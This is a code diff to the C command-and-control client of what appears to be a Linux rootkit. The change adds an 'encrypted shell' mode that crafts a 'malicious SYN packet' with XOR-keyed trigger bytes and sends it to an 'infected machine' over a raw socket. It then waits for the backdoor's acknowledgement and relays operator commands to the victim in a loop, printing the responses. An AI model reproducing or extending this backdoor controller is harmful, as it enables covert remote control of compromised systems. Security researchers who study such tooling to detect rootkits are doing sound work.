@@ -8,6 +8,7 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <stdlib.h>
+#include <time.h>
 
 #include "../common/constants.h"
 #include "../common/c&c.h"
@@ -19,6 +20,13 @@
 #define KMGN  "\x1B[35m"
 #define KRED  "\x1B[31m" 
 #define RESET "\x1B[0m"
+
+//For encrypted shell
+#define SYN_PACKET_PAYLOAD_LEN 0x10
+#define SYN_PACKET_KEY_1 "\x56\xA4"
+#define SYN_PACKET_KEY_2 "\x78\x13"
+#define SYN_PACKET_KEY_3 "\x1F\x29"
+#define SYN_PACKET_SECTION_LEN 0x02
 
 void print_welcome_message(){
     printf("*******************************************************\n");
@@ -185,6 +193,88 @@ void activate_command_control_shell(char* argv){
     free(local_ip);
 }
 
+void activate_command_control_shell_encrypted(char* argv){
+    char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    check_ip_address_format(argv);
+    printf("["KBLU"INFO"RESET"]""Crafting malicious SYN packet...\n");
+    char* payload = malloc(SYN_PACKET_PAYLOAD_LEN);
+    srand(time(NULL));
+    for(int ii=0; ii<SYN_PACKET_PAYLOAD_LEN; ii++){
+        payload[ii] = rand();
+    }
+    //Follow protocol rules
+    char section[SYN_PACKET_SECTION_LEN];
+    char section2[SYN_PACKET_SECTION_LEN];
+    char key1[SYN_PACKET_SECTION_LEN] = SYN_PACKET_KEY_1;
+    char key2[SYN_PACKET_SECTION_LEN] = SYN_PACKET_KEY_2;
+    char key3[SYN_PACKET_SECTION_LEN] = SYN_PACKET_KEY_3;
+    char result[SYN_PACKET_SECTION_LEN];
+    strncpy(section, payload, SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<SYN_PACKET_SECTION_LEN; ii++){
+        result[ii] = section[ii] ^ key1[ii];
+    }
+    strncpy(payload+0x06, result, SYN_PACKET_SECTION_LEN);
+
+    strncpy(section, payload+0x02, SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<SYN_PACKET_SECTION_LEN; ii++){
+        result[ii] = section[ii] ^ key2[ii];
+    }
+    strncpy(payload+0x0A, result, SYN_PACKET_SECTION_LEN);
+
+    strncpy(section, payload+0x06, SYN_PACKET_SECTION_LEN);
+    strncpy(section2, payload+0x0A, SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<SYN_PACKET_SECTION_LEN; ii++){
+        result[ii] = section[ii] ^ section2[ii] ^ key2[ii];
+    }
+
+    strncpy(payload+0x0D, result, SYN_PACKET_SECTION_LEN);
+    
+    
+
+
+    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, CC_PROT_SYN);
+    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
+    //Sending the malicious payload
+    if(rawsocket_send(packet)<0){
+        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
+        return;
+    }else{
+        printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
+    }
+    printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
+    
+    //Wait for rootkit ACK to ensure it's up
+    rawsocket_sniff_pattern(CC_PROT_ACK);
+    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");   
+
+    //Received ACK, we proceed to send command
+    while(1){
+        char buf[BUFSIZ];                                                                                                                                                          
+        printf(""KYLW"c>:"RESET"");                                                                                                                                                              
+        fgets(buf, BUFSIZ, stdin);
+        if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
+            buf[strlen(buf)-1] = '\0';   
+        }                                                                                                                                                                         
+        
+        char msg[BUFSIZ];
+        strcpy(msg, CC_PROT_MSG);
+        strcat(msg, buf);
+        packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, msg);
+        printf("Sending %s\n", msg);
+        if(rawsocket_send(packet)<0){
+            printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
+            return;
+        }
+        printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
+        packet = rawsocket_sniff_pattern(CC_PROT_MSG);
+        char* res = packet.payload;
+        printf("["KGRN"RESPONSE"RESET"] %s\n", res);   
+    }
+    
+    free(local_ip);
+}
+
 
 void main(int argc, char* argv[]){
     if(argc<2){
@@ -204,7 +294,7 @@ void main(int argc, char* argv[]){
     char path_arg[512];
 
     //Command line argument parsing
-    while ((opt = getopt(argc, argv, ":S:c:h")) != -1) {
+    while ((opt = getopt(argc, argv, ":S:c:h:e")) != -1) {
         switch (opt) {
         case 'S':
             print_welcome_message();
@@ -225,6 +315,17 @@ void main(int argc, char* argv[]){
             //printf("Option S has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             activate_command_control_shell(dest_address);
+            PARAM_MODULE_ACTIVATED = 1;
+            
+            break;
+        case 'e':
+            print_welcome_message();
+            sleep(1);
+            //Send a secret message
+            printf("["KBLU"INFO"RESET"]""Activated COMMAND & CONTROL encrypted shell\n");
+            //printf("Option S has argument %s\n", optarg);
+            strcpy(dest_address, optarg);
+            activate_command_control_shell_encrypted(dest_address);
             PARAM_MODULE_ACTIVATED = 1;
             
             break;
